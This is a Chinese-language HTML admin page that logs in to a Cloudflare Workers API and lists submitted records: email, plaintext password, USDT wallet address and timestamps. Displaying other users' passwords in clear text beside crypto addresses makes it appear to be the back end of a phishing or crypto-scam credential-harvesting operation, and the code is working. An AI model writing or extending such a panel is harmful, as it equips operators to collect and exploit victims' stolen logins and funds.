<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>提交查询后台</title>
<style>
:root{
  --bg:#f4f6f9; --surface:#fff; --ink:#1a2233; --muted:#5b6675;
  --brand:#2f6bff; --brand-deep:#1f4fd6; --gold:#f5a623;
  --line:#e4e9f0; --line-soft:#eef2f7; --green:#12b76a; --red:#e5484d;
  --font:system-ui,-apple-system,"Segoe UI","Microsoft YaHei","PingFang SC",Roboto,Arial,sans-serif;
  --mono:ui-monospace,"SF Mono",Menlo,Consolas,monospace;
}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:var(--font);background:var(--bg);color:var(--ink);font-size:14px;line-height:1.55;min-height:100vh;padding:24px 16px;-webkit-font-smoothing:antialiased}
.wrap{max-width:1080px;margin:0 auto}

/* 登录 */
.login{max-width:400px;margin:8vh auto 0;background:var(--surface);border:1px solid var(--line);border-radius:18px;padding:36px 32px;box-shadow:0 20px 50px -20px rgba(26,34,51,.25);text-align:center}
.login .mark{width:52px;height:52px;border-radius:14px;background:linear-gradient(135deg,var(--brand),var(--brand-deep));display:grid;place-items:center;margin:0 auto 16px;color:#fff;font-size:24px}
.login h1{font-size:20px;font-weight:800}
.login .sub{color:var(--muted);font-size:13px;margin:6px 0 26px}
.login .fld{text-align:left;margin-bottom:14px}
.login label{display:block;font-size:12px;font-weight:700;color:var(--ink);margin-bottom:7px}
.login input{width:100%;min-height:48px;padding:0 16px;border:1px solid var(--line);border-radius:12px;font-size:15px;background:#fafbfd;transition:border-color .2s,background .2s}
.login input:focus{outline:none;border-color:var(--brand);background:#fff}
.login button{width:100%;min-height:50px;border:0;border-radius:12px;background:linear-gradient(135deg,var(--brand),var(--brand-deep));color:#fff;font-weight:700;font-size:15px;cursor:pointer;transition:transform .15s,opacity .2s}
.login button:active{transform:scale(.98)}
.login button:disabled{opacity:.6;cursor:not-allowed}
.err{color:var(--red);font-size:12.5px;margin-top:12px;min-height:17px}

/* 数据页 */
.topbar{display:flex;align-items:center;justify-content:space-between;gap:14px;flex-wrap:wrap;margin-bottom:18px}
.brandline{display:flex;align-items:center;gap:12px}
.brandline .mark{width:38px;height:38px;border-radius:11px;background:linear-gradient(135deg,var(--brand),var(--brand-deep));display:grid;place-items:center;color:#fff;font-size:17px}
.brandline h1{font-size:18px;font-weight:800}
.brandline .count{display:inline-block;margin-left:8px;padding:3px 10px;border-radius:99px;background:#eaf1ff;color:var(--brand-deep);font-size:11.5px;font-weight:700}
.actions{display:flex;gap:8px}
.ghost{min-height:38px;padding:0 16px;border:1px solid var(--line);border-radius:10px;background:var(--surface);color:var(--ink);font-weight:700;font-size:13px;cursor:pointer;transition:border-color .2s,transform .15s}
.ghost:active{transform:scale(.97)}

.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:18px}
.chip{background:var(--surface);border:1px solid var(--line);border-radius:14px;padding:14px 16px}
.chip .l{font-size:11.5px;font-weight:700;letter-spacing:.04em;color:var(--muted)}
.chip .v{font-size:20px;font-weight:800;margin-top:3px;font-variant-numeric:tabular-nums}
.chip .v small{font-size:11.5px;font-weight:600;color:var(--muted);margin-left:4px}
.chip.gold{background:#fffaf0;border-color:#f3e2c4}
.chip.gold .v{color:#b5780a}

.tbl{overflow-x:auto;background:var(--surface);border:1px solid var(--line);border-radius:16px;box-shadow:0 20px 44px -30px rgba(26,34,51,.35)}
table{width:100%;border-collapse:collapse;font-size:13px;min-width:760px}
th,td{text-align:left;padding:12px 14px;white-space:nowrap}
thead th{background:#f7f9fc;color:var(--ink);font-weight:800;font-size:12px;letter-spacing:.04em;border-bottom:1px solid var(--line)}
tbody td{border-bottom:1px solid var(--line-soft)}
tbody tr:last-child td{border-bottom:0}
tbody tr:hover td{background:#fafbfd}
td.mono{font-family:var(--mono);font-size:12.5px}
td.addr{font-family:var(--mono);font-size:12px;max-width:260px;white-space:normal;word-break:break-all}
td.pass{font-family:var(--mono);font-size:12.5px;color:var(--brand-deep)}
.empty{color:var(--muted);text-align:center;padding:44px 12px}
#info{color:var(--muted);font-size:12.5px;margin:0 0 12px 2px}
@media (max-width:640px){.cards{grid-template-columns:1fr 1fr}.chip:last-child{grid-column:1/-1}}
</style>
</head>
<body>
<div class="wrap">

  <div class="login" id="loginView">
    <div class="mark">🔐</div>
    <h1>提交查询后台</h1>
    <p class="sub">登录后查看用户提交的注册与 USDT 地址信息</p>
    <div class="fld">
      <label for="username">账号</label>
      <input id="username" autocomplete="username" placeholder="请输入账号">
    </div>
    <div class="fld">
      <label for="password">密码</label>
      <input id="password" type="password" autocomplete="current-password" placeholder="请输入密码">
    </div>
    <button id="loginBtn">登 录</button>
    <p class="err" id="loginErr"></p>
  </div>

  <div id="dataView" hidden>
    <div class="topbar">
      <div class="brandline">
        <span class="mark">📋</span>
        <h1>提交记录<span class="count" id="countChip">—</span></h1>
      </div>
      <div class="actions">
        <button class="ghost" id="refreshBtn">刷新</button>
        <button class="ghost" id="logoutBtn">退出登录</button>
      </div>
    </div>

    <div class="cards">
      <div class="chip gold"><div class="l">总提交数</div><div class="v" id="statTotal">—</div></div>
      <div class="chip"><div class="l">已绑定 USDT</div><div class="v" id="statBound">—</div></div>
      <div class="chip"><div class="l">最新提交</div><div class="v" id="statLatest" style="font-size:14px">—</div></div>
    </div>

    <p id="info"></p>
    <div class="tbl">
      <table>
        <thead>
          <tr>
            <th>#</th><th>邮箱</th><th>密码</th><th>USDT 地址</th><th>提交时间（+8）</th><th>更新时间（+8）</th>
          </tr>
        </thead>
        <tbody id="tbody"></tbody>
      </table>
    </div>
  </div>
</div>

<script>
const API = 'https://soft-silence-98c5.mkyusds82a.workers.dev';
let token = localStorage.getItem('ac_admin_token') || '';

const loginView = document.getElementById('loginView');
const dataView = document.getElementById('dataView');
const loginErr = document.getElementById('loginErr');
const info = document.getElementById('info');
const tbody = document.getElementById('tbody');

document.getElementById('loginBtn').addEventListener('click', login);
document.getElementById('refreshBtn').addEventListener('click', load);
document.getElementById('logoutBtn').addEventListener('click', logout);
document.getElementById('password').addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
document.getElementById('username').addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('password').focus(); });

function showLogin(){ loginView.hidden = false; dataView.hidden = true; }
function showData(){ loginView.hidden = true; dataView.hidden = false; }

const esc = s => String(s == null ? '' : s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));

function fmt(s){
  if(!s) return '—';
  const d = new Date(String(s).replace(' ', 'T') + 'Z');
  if(isNaN(d)) return s;
  return d.toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai', hour12: false });
}

async function login(){
  loginErr.textContent = '';
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value;
  if(!username || !password){ loginErr.textContent = '请输入账号和密码。'; return; }
  const btn = document.getElementById('loginBtn');
  btn.disabled = true;
  try{
    const res = await fetch(API + '/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const data = await res.json().catch(() => ({}));
    if(res.ok && data.ok && data.token){
      token = data.token;
      localStorage.setItem('ac_admin_token', token);
      showData();
      await load();
    }else{
      loginErr.textContent = '账号或密码错误。';
    }
  }catch(e){ loginErr.textContent = '网络错误，请稍后再试。'; }
  finally{ btn.disabled = false; }
}

async function load(){
  info.textContent = '加载中…';
  try{
    const res = await fetch(API + '/api/submissions?token=' + encodeURIComponent(token));
    if(res.status === 401){ logout(); return; }
    const data = await res.json().catch(() => ({}));
    if(!res.ok){ info.textContent = '加载失败。'; return; }
    render(data.rows || []);
  }catch(e){ info.textContent = '网络错误，请稍后再试。'; }
}

function render(rows){
  const now = new Date();
  const hh = now.getHours().toString().padStart(2, '0');
  const mm = now.getMinutes().toString().padStart(2, '0');
  info.textContent = '共 ' + rows.length + ' 条提交记录 · 刷新于 ' + hh + ':' + mm;

  document.getElementById('countChip').textContent = rows.length + ' 条';
  document.getElementById('statTotal').textContent = rows.length;
  const bound = rows.filter(r => r.usdt_address).length;
  document.getElementById('statBound').textContent = bound;
  document.getElementById('statLatest').textContent = rows.length ? fmt(rows[0].created_at).slice(0, 16) : '—';

  tbody.innerHTML = '';
  if(!rows.length){
    tbody.innerHTML = '<tr><td colspan="6" class="empty">暂无提交记录。</td></tr>';
    return;
  }
  rows.forEach(r => {
    const tr = document.createElement('tr');
    tr.innerHTML =
      '<td class="mono">' + r.id + '</td>' +
      '<td class="mono">' + esc(r.email) + '</td>' +
      '<td class="pass">' + esc(r.password) + '</td>' +
      '<td class="addr">' + (esc(r.usdt_address) || '—') + '</td>' +
      '<td class="mono">' + fmt(r.created_at) + '</td>' +
      '<td class="mono">' + fmt(r.updated_at) + '</td>';
    tbody.appendChild(tr);
  });
}

function logout(){ token = ''; localStorage.removeItem('ac_admin_token'); showLogin(); }

if(token){ showData(); load(); } else { showLogin(); }
</script>
</body>
</html>
